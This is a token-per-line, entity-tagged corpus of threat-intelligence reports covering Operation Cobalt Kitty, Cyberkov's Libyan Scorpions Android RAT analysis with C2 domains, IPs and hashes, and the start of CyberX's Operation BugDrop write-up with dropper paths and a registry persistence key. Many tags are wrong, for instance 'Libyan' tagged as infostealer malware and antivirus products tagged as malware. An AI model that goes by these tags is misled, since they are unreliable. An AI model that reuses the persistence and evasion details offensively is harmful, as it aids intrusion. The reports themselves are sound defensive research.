down
once
.

The
attackers
'
preference
to
use
a
fileless  B_malware.unknown
infrastructure
specifically
in
conjunction
with
Cobalt
Strike
is
very
evident
.

This
could
suggest
that
the
attackers
preferred
to
use
known
tools
that
are
more
expendable
rather
than
using
their
own
custom-built
tools
,
which
were
used
as
a
last
resort
.

Conclusion

Operation
Cobalt
Kitty
was
a
major
cyber
espionage
APT
that
targeted
a
global
corporation
in
Asia
and
was
carried
out
by
the
OceanLotus
Group
.

The
analysis
of
this
APT
proves
how
determined
and
motivated
the
attackers
were
.

They
continuously
changed
techniques
and
upgraded
their
arsenal
to
remain
under
the
radar
.

In
fact
,
they
never
gave
up
,
even
when
the
attack
was
exposed
and
shut
down
by
the
defenders
.

During
the
investigation
of
Operation
Cobalt
Kitty
,
Cybereason
uncovered
and
analyzed
new
tools
in
the
OceanLotus
Group's
attack
arsenal
,
such
as
:

New
backdoor
(
'
Goopy B_malware.backdoor
'
)
using
HTTP
and
DNS
Tunneling
for
C2
communication
.

Undocumented
backdoor
that
used
Outlook
for
C2
communication
and
data
exfiltration
.

Backdoors
exploiting
DLL
sideloading
attacks
in
legitimate
applications
from
Microsoft
,
Google
and
Kaspersky
.

Three
customized
credential
dumping
tools
,
which
are
inspired
by
known
tools
.

In
addition
,
Cybereason
uncovered
new
variants
of
the
'
Denis
'
backdoor
and
managed
to
attribute
the
backdoor
to
the
OceanLotus
Group
–
a
connection
that
had
not
been
publicly
reported
before
.

This
report
provides
a
rare
deep
dive
into
a
sophisticated
APT
that
was
carried
out
by
one
of
the
most
fascinating
groups
operating
in
Asia
.

The
ability
to
closely
monitor
and
detect
the
stages
of
an
entire
APT
lifecycle
–
from
initial
infiltration
to
data
exfiltration
–
is
far
from
trivial
.

The
fact
that
most
of
the
attackers
'
tools
were
not
detected
by
the
antivirus
software
and
other
security
products
deployed
in
the
company's
environment
before
Cybereason
,
is
not
surprising
.

The
attackers
obviously
invested
significant
time
and
effort
in
keeping
the
operation
undetected
,
striving
to
evade
antivirus
detection
.

As
the
investigation
progressed
,
some
of
the
IOCs
observed
in
Operation
Cobalt
Kitty
started
to
emerge
in
the
wild
,
and
recently
some
were
even
reported
being
used
in
other
campaigns
.

It
is
important
to
remember
,
however
,
that
IOCs
have
a
tendency
to
change
over
time
.

Therefore
,
understanding
a
threat
actor's
behavioral
patterns
is
essential
in
combatting
modern
and
sophisticated
APTs
.

The
modus
operandi
and
tools
served
as
behavioral
fingerprints
also
played
an
important
role
in
tying
Operation
Cobalt
Kitty
to
the
OceanLotus
Group
.

Lastly
,
our
research
provides
an
important
testimony
to
the
capabilities
and
working
methods
of
the
OceanLotus
Group
.
Operation
Cobalt
Kitty
is
unique
in
many
ways
,
nonetheless
,
it
is
still
just
one
link
in
the
group's
evergrowing
chain
of
APT
campaigns
.

Orchestrating
multiple
APT
campaigns
in
parallel
and
attacking
a
broad
spectrum
of
targets
takes
an
incredible
amount
of
resources
,
time
,
manpower
and
motivation
.

This
combination
is
likely
to
be
more
common
among
nation-state
actors
.

While
the
are
many
rumours
and
speculations
circulating
in
the
InfoSec
community
,
at
the
time
of
writing
,
there
was
no
publicly
available
evidence
that
can
confirm
that
the
OceanLotus
Group
is
a
nation-state
threat
actor
.

Until
such
evidence
is
made
public
,
we
will
leave
it
to
our
readers
to
judge
for
themselves
.

To
be
continued
...
Meow
.

advanced
persistent
threat
,
APT
,
Cobalt
Strike
,
Cybereason
,
Cybereason
Labs
,
DLL
hijacking
,
DNS
Tunneling
,
fileless  B_malware.unknown
malware
,
OceanLotus
Group
,
Operation
Cobalt
Kitty
,
Powershell

Check
out
more
research
from
Cybereason
Labs
←
See
all
lab
blog
posts
Cyberkov
Co
.
Ltd
.

www.cyberkov.com  B_url.normal
info@cyberkov.com B_url.normal

Hunting
Libyan  B_malware.infosteal
Scorpions I

Investigating
a
Libyan  B_malware.infosteal
Cyber
Espionage
Campaign
Targeting
High-Profile
Influentials

TLP
:
White

For
public
distribution
18/September/2016



Hunting
Libyan  B_malware.infosteal
Scorpions I

Legal
Notice
:

This
document
is
intended
for
public
use
and
distribution
.

Unauthorized
use
or
reproduction
of
this
document
without
referencing
Cyberkov
is
prohibited
.

This
document
has
been
prepared
by
Cyberkov
Co
.
Ltd
.

Document
Control

Document
Title

TLP
Classification

Document
Version

Creation
Date

Last
Modification
Date

Distribution

Reference

Hunting
Libyan  B_malware.infosteal
Scorpions I

White
01/September/2016
18/September/2016

Public
Distribution

PD-001

Cyberkov
Contact
Details

Name

Email

Phone
Number

Fax
Number

Office
Number

General
query

Cyberkov
Media
Office
media@cyberkov.com  B_url.normal
+965
22445500
+1
(
888
)
433-3113
+965
22445500
info@cyberkov.com B_url.normal

Trademark

Cyberkov
and
the
Cyberkov
logo
'
'
are
trademarks
of
Cyberkov
Co
.
Ltd
.

All
other
trademarks
mentioned
in
this
document
are
owned
by
the
mentioned
legacy
body
or
organization
.

The
general
service
conditions
of
Cyberkov
Co
.
Ltd
.

apply
to
this
documentation
,
unless
it
is
explicitly
specified
otherwise
.



Hunting
Libyan  B_malware.infosteal
Scorpions I

Table
of
Contents

Document
Control
...............................................................................................................................................
1

Cyberkov
Contact
Details
....................................................................................................................................
1

Executive
Summary
.............................................................................................................................................
3

Tactics
,
Techniques
and
Procedures
(
TTPs
)
.........................................................................................................
4

Malware
Analysis
.................................................................................................................................................
6

Command
and
Control
Communication
............................................................................................................
21

Sinkhole
.........................................................................................................................................................
21

Real
C2
...........................................................................................................................................................
24

Threat
Actor
and
Attribution
.............................................................................................................................
25

Threat
Actors
Infrastructure
..............................................................................................................................
29

To
Be
Continued
...
.............................................................................................................................................
33

Mitigating
Libyan  B_malware.infosteal
Scorpions I
Attacks
on
Android
..............................................................................................
33

Indicators
of
Compromise
(
IOCs
)
......................................................................................................................
33



Hunting
Libyan  B_malware.infosteal
Scorpions I

Executive
Summary

Libya
maybe
known
in
non-stable
political
system
,
civil
war
and
militant
groups
fighting
for
the
land
and
oil
control
but
it
is
definitely
not
known
in
cyber
malicious
activities
,
cyber
espionage
and
hacking
groups
.

No
parties
in
Libya
before
this
analysis
reported
to
use
cyber
attacks
,
malwares
nor
recruit
hackers
to
spy
on
their
rivals
.

Today
we
have
a
different
story
.

In
the
past
weeks
on
6
August
2016
,
Cyberkov
Security
Incident
Response
Team
(
CSIRT
)
received
a
numerous
Android
malwares
operating
in
different
areas
in
Libya
especially
in
Tripoli
and
Benghazi
.

The
malware
spreads
very
fast
using
Telegram
messenger
application
in
smartphones
,
targeting
high-profile
Libyan  B_malware.infosteal
influential
and
political
figures
.

The
malware
first
discovery
was
after
a
highly
Libyan  B_malware.infosteal
influential
Telegram
account
compromised
via
web
Telegram
using
IP
address
from
Spain
.

The
following
day
,
the
attackers
spread
an
Android
malware
binded
with
legitimate
Android
application
from
the
compromised
Telegram
account
to
all
his
contacts
pretending
it
is
an
important
voice
message
(
misspelled
it
by
'
Voice
Massege.apk
'
)
which
indicates
a
non-english
(
maybe
an
Arabic
)
attacker
.

After
spreading
the
malware
,
more
Android
smartphones
has
been
infected
using
the
same
technique
(
via
Telegram
)
and
then
repost
the
malware
again
and
again
making
a
network
of
victims
.

Analysis
of
this
incident
led
us
to
believe
that
this
operation
and
the
group
behind
it
which
we
call
Libyan  B_malware.infosteal
Scorpions I
is
a
malware
operation
in
use
since
September
2015
and
operated
by
a
politically
motivated
group
whose
main
objective
is
intelligence
gathering
,
spying
on
influentials
and
political
figures
and
operate
an
espionage
campaign
within
Libya
.

Also
,
the
analysis
of
the
incident
led
to
the
discovery
of
multiple
malwares
targeting
Android
and
Windows
machines
.

Libyan  B_malware.infosteal
Scorpions I
threat
actors
used
a
set
of
methods
to
hide
and
operate
their
malwares
.

They
appear
not
to
have
highly
technical
skills
but
a
good
social
engineering
and
phishing
tricks
.

The
threat
actors
are
not
particularly
sophisticated
,
but
it
is
well-understood
that
such
attacks
don't
need
to
be
sophisticated
in
order
to
be
effective
.

Using
malwares
as
weapon
in
an
active
warzone
such
as
Libya
,
make
the
victims
easy
targets
for
assassination
or
kidnapping
by
tracking
their
physical
locations
and
monitoring
them
day
and
night
.


'
'
4

Hunting
Libyan  B_malware.infosteal
Scorpions I

Tactics
,
Techniques
and
Procedures
(
TTPs
)

Libyan  B_malware.infosteal
Scorpions I
is
believed
to
be
a
political
motivated
group
targeting
a
high-level
influential
and
political
figures
in
multiple
cities
within
Libya
.

Libyan  B_malware.infosteal
Scorpions I
first
compromised
a
personal
Telegram
account
for
a
Libyan
influential
person
with
unknown
vector
.

The
victim
received
a
push
notification
from
his
Telegram
app
that
someone
from
Spain
is
logged
into
his
account
:

The
victim
mistakenly
deleted
Telegram
application
from
his
phone
thinking
that
this
is
going
to
stop
the
attacker
(
s
)
.

Second
day
,
the
attacker
used
the
victim
phone
number
to
spear B_malware.infosteal
phish I
his
contacts
in
Telegram
by
pretending
that
the
real
person
is
sending
a
voice
message
while
the
file
is
actually
a
malicious
APK
(
Android
Package
)
file
.

This
APK
file
targets
only
Android-based
smartphones
.

Once
the
new
victim
click
on
the
APK
file
,
the
application
installs
itself
in
the
device
without
any
problem
and
is
fully
functional
.

The
icon
of
the
application
appears
in
the
Apps
menu
named
(
URL
Shortener
)
.



Hunting
Libyan  B_malware.infosteal
Scorpions I

The
real
malicious
code
is
running
in
the
background
as
Android
service1
.

1
https://developer.android.com/guide/components/services.html  B_url.normal



Hunting
Libyan  B_malware.infosteal
Scorpions I

Malware
Analysis

Cyberkov
Security
Incident
Response
Team
(
CSIRT
)
started
analyzing
the
APK
file
(
malware
)
and
the
first
step
was
to
unpack
it
.

After
unpacking
with
apktool
and
reading
(
AndroidManifest.xml
)
file
,
it
appears
that
the
application
is
a
malware
injected
inside
a
legitimate
application
having
java
package
name
:
de.keineantwort.android.urlshortener
.



Hunting
Libyan  B_malware.infosteal
Scorpions I

Searching
for
the
application
in
Google
Play
store
with
that
specific
package
name
(
https://play.google.com/store/apps/details?id=de.keineantwort.android.urlshortener  B_url.normal
)
yields
:



Hunting
Libyan  B_malware.infosteal
Scorpions I

The
application
exists
in
the
store
and
the
Libyan  B_malware.infosteal
Scorpions I
hacking
group
took
an
instance
of
the
APK
and
injected
their
malware
into
that
legitimate
application
to
spread
it
.

The
real
application
is
created
by
keineantwort.de
and
we
have
verified
it
from
their
main
website
:

Going
back
to
(
AndroidManifest.xml
)
file
,
the
malware
register
itself
as
receiver
of
almost
all
intents
and
request
almost
all
permissions
available
in
Android
system
!



Hunting
Libyan  B_malware.infosteal
Scorpions I



Hunting
Libyan  B_malware.infosteal
Scorpions I

The
malware
can
access
location
,
network
state
,
battery
status
,
Bluetooth
,
camera
,
capturing
audio
,
internet
,
...
,
etc
.

After
launching
the
malicious
application
for
the
first
time
,
it
checks
if
the
Android
device
is
rooted
or
not
and
if
rooted
,
it
asks
for
root
permission
.



Hunting
Libyan  B_malware.infosteal
Scorpions I

Carrying
on
the
reverse
engineering
of
the
malware
,
we
found
a
file
called
'
config.json
'
which
is
a
base64
encoded
json
file
containing
the
configuration
of
the
malware
and
its
Command
and
Control
(
C2
)
.
The
characteristics
of
the
malware
(
'
a.txt
'
and
'
config.json
'
files
)
and
the
functionality
of
it
is
very
similar
to
JSocket B_malware.backdoor
and
AlienSpy  B_malware.backdoor
famous
Android
Remote
Access
Tools
(
RATs
)
.

Decoding
the
'
config.json
'
file
using
base64
decoder
shows
that
the
C2
hostname
/
domain
is
:
winmeif.myq-see.com B_url.unknown
using
the
port
64631

Resolving
the
hostname
gives
:
41.208.110.46 B_ip.unknown
which
is
a
static
Libyan  B_malware.infosteal
IP
address
owned
by
Libya
Telecom
and
Technology
Backbone
.



Hunting
Libyan  B_malware.infosteal
Scorpions I

Going
back
to
the
domain
/
hostname
used
by
the
Libyan  B_malware.infosteal
Scorpions I
hacking
group
,
it
appears
that
myqsee.com  B_url.unknown
is
a
dynamic
DNS
service
open
for
the
public
.



Hunting
Libyan  B_malware.infosteal
Scorpions I

Scrolling
down
the
web
page
,
it
is
created
by
Q-See
which
is
a
company
that
sells
cameras
and
it
seems
that
Q-See
published
this
service
to
help
their
customers
to
connect
to
their
IP
cameras
regardless
of
IP
changes
.



Hunting
Libyan  B_malware.infosteal
Scorpions I

The
malware
uses
RootTools B_malware.unknown
and
RootShell B_malware.unknown
components
to
make
root
privileged
tasks
easy
in
Android
.



Hunting
Libyan  B_malware.infosteal
Scorpions I

The
picture
below
showing
that
the
malware
is
capable
of
taking
pictures
from
the
camera
of
the
compromised
device
and
upload
it
to
the
C2
.

The
malware
begins
by
implementing
a
Trust
Manager
that
accepts
all
certificates
so
that
Libyan  B_malware.infosteal
Scorpions I
hackers
are
sure
no
victim
left
disconnected
due
to
SSL
certificates
issues
.



Hunting
Libyan  B_malware.infosteal
Scorpions I

The
malware
is
able
to
turn
the
Android
phone
into
a
remote
listening
bug
by
opening
the
Microphone
and
recording
the
audio
then
send
it
to
the
C2
.

The
malware
is
able
to
browse
the
files
and
folders
stored
inside
the
Android
device
.



Hunting
Libyan  B_malware.infosteal
Scorpions I

The
malware
is
able
to
monitor
the
physical
location
of
the
compromised
Android
device
.

The
malware
is
able
to
get
the
call
logs
along
with
phone
numbers
,
duration
and
date
and
time
of
each
call
.



Hunting
Libyan  B_malware.infosteal
Scorpions I

The
malware
is
able
to
read
the
SMS
messages
and
the
list
of
contacts
saved
in
the
device
.

Besides
,
the
malware
is
able
to
get
the
phone
number
,
country
and
network
operator
name
from
cellular
towers
of
the
telecom
company
of
the
target
.



Hunting
Libyan  B_malware.infosteal
Scorpions I

The
malware
uses
Allatori  B_malware.normal
Java  I
Obfuscator  I
to
protect
the
code
and
make
it
harder
to
reverse
engineer
and
it
obviously
uses
communication
protocol
based
on
Java
JSON
objects
encapsulated
in
SSL
connection
wrapper
.

Again
,
this
behavior
and
characteristics
of
the
malware
is
very
similar
to
JSocket B_malware.backdoor
and
AlienSpy  B_malware.backdoor
Android
RATs
.

After
finalizing
the
analysis
of
the
Android
malware
,
Cyberkov
uploaded
it
to
VirusTotal
to
see
if
it
has
been
uploaded
before
and
what
information
we
can
get
from
it
:



Hunting
Libyan  B_malware.infosteal
Scorpions I

Cyberkov
discovered
that
the
malware
has
not
been
uploaded
to
VirusTotal
before
and
the
first
sample
of
this
malware
has
been
uploaded
by
us
.

However
,
8
out
of
54
AntiVirus
engines
detect
it
which
is
a
very
low
detection
rate
(
15%
)
.

Most
and
major
American
top
Gartner
Antivirus
companies
did
not
detect
it
!
!



Hunting
Libyan  B_malware.infosteal
Scorpions I

Command
and
Control
Communication

Cyberkov
tried
to
discover
the
attacker
behind
this
malicious
application
by
sinkholing
the
malware
and
analyzing
the
real
C2
.

Sinkhole

Cyberkov
created
a
fake
server
simulating
the
real
C2
of
the
Libyan  B_malware.infosteal
Scorpions I
hacking
group
and
sinkholed
the
malware
to
study
the
behavior
of
the
malware
deeply
.

Upon
connection
to
the
C2
,
the
malware
sends
a
lot
of
information
about
the
target
including
:
Country
,
Malware
Path
,
Local
IP
Address
,
RAM
,
Android
Version
,
Device
Name
,
...
,
etc
.



Hunting
Libyan  B_malware.infosteal
Scorpions I

The
fake
C2
server
is
able
to
send
fake
commands
to
the
malware
and
read
the
reply
as
well
.

Those
commands
(
103
,
104
and
105
)
correspond
to
the
following
list
of
commands
defined
in
the
malware
:



Hunting
Libyan  B_malware.infosteal
Scorpions I

Each
number
corresponds
to
one
command
to
be
done
by
the
malware
.

For
example
,
the
command
(
111
)
uninstalls
the
real
application
'
URLShortener
'
:

Will
result
in
:



Hunting
Libyan  B_malware.infosteal
Scorpions I

Real
C2

By
connecting
to
the
real
C2
IP
address
,
Cyberkov
found
that
the
malware
is
really
of
JSocket B_malware.backdoor
/
AlienSpy  B_malware.backdoor
family
of
RATs
since
that
family
of
RATs
open
the
port
1234
with
a
self-signed
certificate
of
'
assylias
'
2
.

According
to
Shodan
,
the
port
(
1234
)
has
been
spotted
open
since
12-07-2016
which
is
25
days
before
the
first
discovery
.
https://www.fidelissecurity.com/sites/default/files/FTA_1019_Ratcheting_Down_on_JSocket_A_PC_and_Android_Thre
at_FINAL.pdf  B_url.normal



Hunting
Libyan  B_malware.infosteal
Scorpions I

Threat
Actor
and
Attribution

Seems
like
the
Libyan  B_malware.infosteal
Scorpions I
threat
actors
are
running
multiple
Android
RATs
since
numerous
ports
protected
by
SSL
layer
are
open
in
(
winmeif.myq-see.com B_url.unknown
)
machine
.

Also
,
the
Libyan  B_malware.infosteal
Scorpions I
threat
actors
left
phpinfo.php
script
on
the
webserver
running
on
port
80
with
useful
information
that
could
expose
them
.

Their
machine
is
running
Windows
7
Professional
Service
Pack
1
.



Hunting
Libyan  B_malware.infosteal
Scorpions I

Username
of
the
Windows
machine
is
admin
.

The
computer
name
of
Windows
machine
is
ADMIN
.



Hunting
Libyan  B_malware.infosteal
Scorpions I

The
Libyan  B_malware.infosteal
Scorpions I
threat
actors
use
a
Dell
laptop
and
have
Skype
installed
and
are
setting
behind
a
NAT
and
their
internal
IP
address
is
192.168.1.16  B_ip.unknown

The
attackers
also
have
a
PhpMyAdmin
script
installed
in
their
machine
:



Hunting
Libyan  B_malware.infosteal
Scorpions I

Cyberkov
Security
Incident
Response
Team
(
CSIRT
)
tried
to
brute
force
the
password
of
the
database
using
the
top
most
common
100
passwords
.

Unfortunately
,
the
attempt
failed
.



Hunting
Libyan  B_malware.infosteal
Scorpions I

Threat
Actors
Infrastructure

Going
back
to
the
IP
address
of
the
attackers
(
41.208.110.46 B_ip.unknown
)
,
it
is
very
important
to
discover
the
attackers
infrastructure
that
maybe
used
to
launch
wider
attacks
using
multiple
RATs
on
multiple
platforms
.

By
using
Threat
Intelligence
Platforms
and
Feeds
such
as
PassiveTotal
,
Cyberkov
was
able
to
discover
more
activities
and
campaigns
run
by
Libyan  B_malware.infosteal
Scorpions I
.

The
following
Heatmap
shows
that
the
IP
address
(
41.208.110.46 B_ip.unknown
)
has
been
used
to
launch
attacks
since
9/9/2015
until
the
time
of
writing
this
report
using
5
different
hostnames
and
multiple
malicious
malwares
.

The
following
table
summarizes
the
list
of
hostnames
used
by
the
attacker
(
s
)
:

Hostname

Samsung.ddns.me B_url.unknown

Wininit.myq-see.com B_url.unknown

Winmeif.myq-see.com B_url.unknown

Collge.myq-see.com  B_url.unknown

Sara2011.no-ip.biz  B_url.unknown

First
Seen
26-04-2016
24-05-2016
07-08-2016
09-09-2015
08-10-2015

Last
Seen
08-09-2016
22-08-2016
22-08-2016
22-08-2016
08-10-2015



Hunting
Libyan  B_malware.infosteal
Scorpions I

All
of
the
hostnames
point
to
the
same
C2
IP
address
used
by
the
attackers
(
but
sara2011.no-ip.biz  B_url.unknown
)
:

Also
,
using
PassiveTotal
,
the
C2
is
connected
to
2
more
malwares
used
by
the
attackers
having
the
following
hashes
(
MD5
)
:

1738ecf69b8303934bb10170bcef8926  B_hash

93ebc337c5fe4794d33df155986a284d  B_hash

The
first
hash
in
the
above
picture
is
for
the
malware
'
Voice
Massege.apk
'
which
we
have
analyzed
already
.



Hunting
Libyan  B_malware.infosteal
Scorpions I

The
second
hash
(
1738ecf69b8303934bb10170bcef8926  B_hash
)
is
named
(
Benghazi.exe
)
and
have
detection
rate
of
21
out
of
56
(
37.5%
)
and
has
been
uploaded
first
time
to
VirusTotal
on
23-04-2016
.

Notice
that
this
malware
targets
Windows
machines
and
not
Android
smartphones
.

It
is
compiled
on
15-042016
and
is
coded
in
Visual
Basic
.



Hunting
Libyan  B_malware.infosteal
Scorpions I

The
third
hash
(
93ebc337c5fe4794d33df155986a284d  B_hash
)
is
a
DroidJack B_malware.backdoor
,
a
malicious
attacking
platform
,
targeting
android
smartphones
.

Also
,
the
name
of
activities
and
services
contains
net.droidjack.server  B_url.unknown
name
which
makes
us
sure
it
is
DroidJack B_malware.backdoor
malware
.



Hunting
Libyan  B_malware.infosteal
Scorpions I

To
Be
Continued
...

Cyberkov
will
continue
investigating
Libyan  B_malware.infosteal
Scorpions I
hacking
group
operating
in
Libya
and
will
update
this
report
with
a
follow-up
reports
regarding
any
future
cyber
activities
.

Mitigating
Libyan  B_malware.infosteal
Scorpions I
Attacks
on
Android
Cyberkov
recommends
the
following
points
in
order
to
protect
the
victims
from
such
malwares
:

Install
DrWeb B_malware.normal
Security
Space
for
Android
(
A
leading
Russian
AntiVirus
Company
)

Update
your
Android
operating
system
regularly

Use
of
DrWeb B_malware.normal
Telegram
Bot
(
DrWebBot  B_malware.normal
)
to
scan
links
and
files
shared
on
Telegram
chats
or
groups

Never
install
applications
from
unknown
sources

Use
Telegram
with
Secret
Chat
feature
only

Always
verify
with
your
partners
when
sending
and
receiving
files

Install
Zemana  B_malware.normal
Mobile
AntiVirus
(
A
leading
Turkish
AntiMalware
and
AntiFraud
Company
)

Indicators
of
Compromise
(
IOCs
)

The
following
table
summarizes
the
list
of
indicators
to
detect
the
malware
:

Type

Sha256

Sha256

Sha256

Sha1

Sha1

Sha1

Filename

Filename

Filename

Domain

Domain

Domain

Domain

Domain

Indicator
9d8e5ccd4cf543b4b41e4c6a1caae1409076a26ee74c61c148dffd3ce87d7787  B_hash

4e656834a93ce9c3df40fe9a3ee1efcccc728e7ea997dc2526b216b8fd21cbf6  B_hash
e66d795d0c832ad16381d433a13a2cb57ab097d90e9c73a1178a95132b1c0f70  B_hash
1738ecf69b8303934bb10170bcef8926  B_hash
93ebc337c5fe4794d33df155986a284d  B_hash
1c8a1aa75d514d9b1c7118458e0b8a14  B_hash
41096b7f808a91ee773bbba304ea2cd0fa42519d  B_hash
46d832a9c1d6c34edffee361aca3de65db1b7932  B_hash
2e2d1315c47db73ba8facb99240ca6c085a9acbc  B_hash

Voice
Massege.apk

Benghazi.exe

VPN.apk
41.208.110.46 B_ip.unknown
winmeif.myq-see.com B_url.unknown

Wininit.myq-see.com B_url.unknown

Samsung.ddns.me B_url.unknown

Collge.myq-see.com  B_url.unknown

Sara2011.no-ip.biz  B_url.unknown
Operation
BugDrop
:
CyberX
Discovers
Large-Scale
Cyber
-
Reconnaissance
Operation
Targeting
Ukrainian
Organizations
cyberx-labs.com/en/blog/operation-bugdrop-cyberx-discovers-large-scale-cyber-reconnaissance-operation/  B_url.normal

By
Phil
Neray
2/15/2017

CyberX
has
discovered
a
new
,
large-scale
cyber-reconnaissance
operation
targeting
a
broad
range
of
targets
in
the
Ukraine
.

Because
it
eavesdrops
on
sensitive
conversations
by
remotely
controlling
PC
microphones
–
in
order
to
surreptitiously
'
bug
'
its
targets
–
and
uses
Dropbox
to
store
exfiltrated
data
,
CyberX
has
named
it
'
Operation
BugDrop
.
'

Operation
BugDrop
:
Targets

CyberX
has
confirmed
at
least
70
victims
successfully
targeted
by
the
operation
in
a
range
of
sectors
including
critical
infrastructure
,
media
,
and
scientific
research
.

The
operation
seeks
to
capture
a
range
of
sensitive
information
from
its
targets
including
audio
recordings
of
conversations
,
screen
shots
,
documents
and
passwords
.

Unlike
video
recordings
,
which
are
often
blocked
by
users
simply
placing
tape
over
the
camera
lens
,
it
is
virtually
impossible
to
block
your
computer's
microphone
without
physically
accessing
and
disabling
the
PC
hardware
.

Most
of
the
targets
are
located
in
the
Ukraine
,
but
there
are
also
targets
in
Russia
and
a
smaller
number
of
targets
in
Saudi
Arabia
and
Austria
.

Many
targets
are
located
in
the
self-declared
separatist
states
of
Donetsk
and
Luhansk
,
which
have
been
classified
as
terrorist
organizations
by
the
Ukrainian
government
.

Examples
of
Operation
BugDrop
targets
identified
by
CyberX
so
far
include
:

A
company
that
designs
remote
monitoring
systems
for
oil
&
gas
pipeline
infrastructures
.

An
international
organization
that
monitors
human
rights
,
counter-terrorism
and
cyberattacks
on
critical
infrastructure
in
the
Ukraine
.

An
engineering
company
that
designs
electrical
substations
,
gas
distribution
pipelines
,
and
water
supply
plants
.

A
scientific
research
institute
.

Editors
of
Ukrainian
newspapers
.

Operation
BugDrop
is
a
well-organized
operation
that
employs
sophisticated
malware
and
appears
to
be
backed
by
an
organization
with
substantial
resources
.

In
particular
,
the
operation
requires
a
massive
back-end
infrastructure
to
store
,
decrypt
and
analyze
several
GB
per
day
of
unstructured
data
that
is
being
captured
from
its
targets
.

A
large
team
of
human
analysts
is
also
required
to
manually
sort
through
captured
data
and
process
it
manually
and
/
or
with
Big
Data-like
analytics
.

Initially
,
CyberX
saw
similarities
between
Operation
BugDrop
and
a
previous
cyber-surveillance
operation
discovered
by
ESET
in
May
2016
called
Operation
Groundbait
.

However
,
despite
some
similarities
in
the
Tactics
,
Techniques
,
and
Procedures
(
TTPs
)
used
by
the
hackers
in
both
operations
,
Operation
BugDrop's
TTPs
are
1/11
significantly
more
sophisticated
than
those
used
in
the
earlier
operation
.

For
example
,
it
uses
:

Dropbox
for
data
exfiltration
,
a
clever
approach
because
Dropbox
traffic
is
typically
not
blocked
or
monitored
by
corporate
firewalls
.

Reflective
DLL
Injection
,
an
advanced
technique
for
injecting
malware
that
was
also
used
by
BlackEnergy B_malware.ddos
in
the
Ukrainian
grid
attacks
and
by
Duqu  B_malware.infosteal
in
the
Stuxnet B_malware.backdoor
attacks
on
Iranian
nuclear
facilities
.

Reflective
DLL
Injection
loads
malicious
code
without
calling
the
normal
Windows
API
calls
,
thereby
bypassing
security
verification
of
the
code
before
its
gets
loaded
into
memory
.

Encrypted
DLLs
,
thereby
avoiding
detection
by
common
anti-virus
and
sandboxing
systems
because
they're
unable
to
analyze
encrypted
files
.

Legitimate
free
web
hosting
sites
for
its
command-and-control
infrastructure
.

C&C
servers
are
a
potential
pitfall
for
attackers
as
investigators
can
often
identify
attackers
using
registration
details
for
the
C&C
server
obtained
via
freely-available
tools
such
as
whois
and
PassiveTotal
.

Free
web
hosting
sites
,
on
the
other
hand
,
require
little
or
no
registration
information
.

Operation
BugDrop
uses
a
free
web
hosting
site
to
store
the
core
malware
module
that
gets
downloaded
to
infected
victims
.

In
comparison
,
the
Groundbait
attackers
registered
and
paid
for
their
own
malicious
domains
and
IP
addressees
.

Operation
BugDrop
infects
its
victims
using
targeted
email
phishing
attacks
and
malicious
macros
embedded
in
Microsoft
Office
attachments
.

It
also
uses
clever
social
engineering
to
trick
users
into
enabling
macros
if
they
aren't
already
enabled
.

How
CyberX
Investigated
Operation
BugDrop

CyberX's
Threat
Intelligence
Research
team
initially
discovered
Operation
BugDrop
malware
in
the
wild
.

The
team
then
reverse-engineered
the
code
to
analyze
its
various
components
(
decoy
documents
used
in
phishing
attacks
,
droppers
,
main
module
,
microphone
module
,
etc
.
)
and
how
the
malware
communicates
with
its
C&C
servers
.

The
team
also
needed
to
reverse-engineer
exactly
how
the
malware
generates
its
encryption
keys
.

Distribution
of
Targets
by
Geography
2/11

Compilation
Dates

The
modules
were
compiled
about
a
month
after
ESET
announced
the
existence
of
Operation
Groundbait
.

If
the
two
operations
are
indeed
related
,
this
might
indicate
the
group
decided
it
needed
to
change
its
TTPs
to
avoid
detection
.

Technical
Details
3/11

High-level
view
of
malware
architecture
1
.
Infection
Method

Users
are
targeted
via
specially
crafted
phishing
emails
and
prompted
to
open
a
Microsoft
Word
decoy
document
containing
malicious
macros
.

If
macros
are
disabled
,
users
are
presented
with
a
dialog
box
(
below
)
prompting
them
to
enable
macros
.

The
dialog
box
is
well
designed
and
appears
to
be
an
authentic
Microsoft
Office
message
.

4/11

Russian
text
in
dialog
box
:
'
внимание
!
Файл
создан
в
более
новой
версии
программы
Микрософт
Office
.

Необходимо
включить
Макросы
для
корректного
отображения
содержимого
документа
'

This
is
translated
as
:
'
Attention
!
The
file
was
created
in
a
newer
version
of
Microsoft
Office
programs
.

You
must
enable
macros
to
correctly
display
the
contents
of
a
document
.
'

Based
on
the
document
metadata
,
the
language
in
which
the
list
is
written
is
Ukrainian
,
but
the
original
language
of
the
document
is
Russian
.

The
creator
of
the
decoy
document
creator
is
named
'
Siada
.
'

Last
modified
date
is
2016-12-22
10:37:00
5/11

The
document
itself
(
below
)
shows
a
list
of
military
personnel
with
personal
details
such
as
birthdate
and
address
:

Decoy
document
with
personal
information
about
military
personnel

2
.
Main
Downloader

The
main
downloader
is
extracted
from
the
decoy
document
via
a
malicious
VB
script
that
runs
it
from
the
temp
folder
.

The
downloader
has
low
detection
rates
(
detected
by
only
4
out
of
54
AV
products
)
.

3
.
Dropper
—
Stage
0

The
icon
for
the
downloader
EXE
was
copied
from
a
Russian
social
media
site
(
http://sevastopol.su/world.php?id=90195 B_url.unknown
)
.

The
icon
itself
is
a
meme
that
jokes
about
Ukrainians
(
http://s017.radikal.ru/i424/1609/83/0c3a23de7967.jpg  B_url.unknown
)
.

Dropper
icon
6/11

Russian
social
media
site
from
where
icon
for
dropper
EXE
was
obtained

The
dropper
has
2
DLLs
stored
in
its
resources
;
they
are
XOR'ed
in
such
way
that
the
current
byte
is
XOR'ed
with
the
previous
byte
.

This
technique
is
much
better
than
just
plain
XOR
because
it
results
in
a
byte
distribution
that
doesn't
look
like
a
normal
Portable
Executable
(
PE
)
file
loader
.

This
helps
obfuscate
the
file
so
that
it
will
not
be
detected
by
anti-virus
systems
.

The
DLLs
are
extracted
into
the
app
data
folder
:
%USERPROFILE%\AppData\Roaming\Microsoft\VSA\.nlp
–
Stage
1
%USERPROFILE%\AppData\Roaming\Microsoft\Protect\.nlp.hist
–
Stage
2
The
first
stage
is
executed
and
the
DLL
is
loaded
using
Reflective
DLL
Injection
.

4
.
Dropper
–
Stage
1
–
Achieving
Persistency

Internal
name
:
loadCryptRunner.dll

Compiled
:
Mon
Dec
12
10:09:15
2016
7/11

Responsible
for
persistency
and
executing
the
downloader
DLL
,
the
Stage
1
Dropper
registers
itself
in
the
registry
under
the
key
:

HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run\drvpath

RUNDLL32
'
